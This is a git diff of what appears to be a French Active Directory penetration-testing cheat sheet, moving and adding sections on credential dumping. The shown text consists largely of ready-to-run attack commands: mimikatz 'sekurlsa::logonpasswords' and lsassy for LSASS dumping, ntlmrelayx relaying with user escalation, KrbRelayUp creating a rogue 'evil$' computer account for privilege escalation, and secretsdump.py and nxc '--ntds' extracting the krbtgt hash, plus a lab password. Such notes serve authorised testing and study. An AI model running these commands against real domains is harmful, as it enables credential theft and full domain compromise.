@@ -59,14 +59,17 @@ date: '2024-01-10'
   - [Bloodhound](#bloodhound-1)
     - [Windows](#windows-6)
     - [Linux](#linux-3)
+  - [Création d'un compte machine](#création-dun-compte-machine)
+    - [Linux](#linux-4)
+  - [Relais](#relais)
+    - [Linux](#linux-5)
+  - [KrbRelayUp](#krbrelayup)
   - [Dump Lsass](#dump-lsass)
     - [Windows](#windows-7)
-    - [Linux](#linux-4)
-  - [Création d'un compte machine](#création-dun-compte-machine)
-    - [Linux](#linux-5)
-  - [Relais](#relais)
     - [Linux](#linux-6)
-  - [KrbRelayUp](#krbrelayup)
+  - [Dump NTDS](#dump-ntds)
+    - [Windows](#windows-8)
+    - [Linux](#linux-7)
 - [Lab](#lab)
   - [**AD**](#ad)
   - [Srv standelone](#srv-standelone)
@@ -453,20 +456,6 @@ rusthound --domain domain.local -u 'user' -p 'password'  -o output -z --fqdn-res
 bloodhound-python -u user -p 'password' -ns 10.10.10.10 -d domain.local -c all
 ```
 
-## Dump Lsass
-
-### Windows
-```
-privilege::debug
-token::elevate
-sekurlsa::logonpasswords
-```
-
-### Linux
-```
-nxc smb mssql.klemou.corp -u crz -p '992e71f059.585a7ffa20' -M lsassy
-```
-
 ## Création d'un compte machine
 
 
@@ -499,6 +488,37 @@ ntlmrelayx.py -t "ldap://dc01.klemou.corp" -smb2support --escalate-user domainus
 .\KrbRelayUp.exe relay -Domain klemou.corp -CreateNewComputerAccount -Computer evil$ -ComputerPassword evil123
 .\KrbRelayUp.exe spawn -m rbcd -d klemou.corp -dc DC02.klemou.corp -cn KRBRELAYUP$ -cp evil123
 ```
+
+## Dump Lsass
+
+### Windows
+```
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+```
+
+### Linux
+```
+nxc smb mssql.klemou.corp -u crz -p '992e71f059.585a7ffa20' -M lsassy
+```
+
+## Dump NTDS
+
+### Windows
+
+```
+mimikatz #TODO
+```
+
+### Linux
+
+```
+secretsdump.py DAuser:password@dc.domain.local -just-dc-user krbtgt
+nxc smb dc01.domain.local -u 'DAuser' -p 'password' --ntds --user krbtgt
+```
+
+
 # Lab
 
 ## **AD**
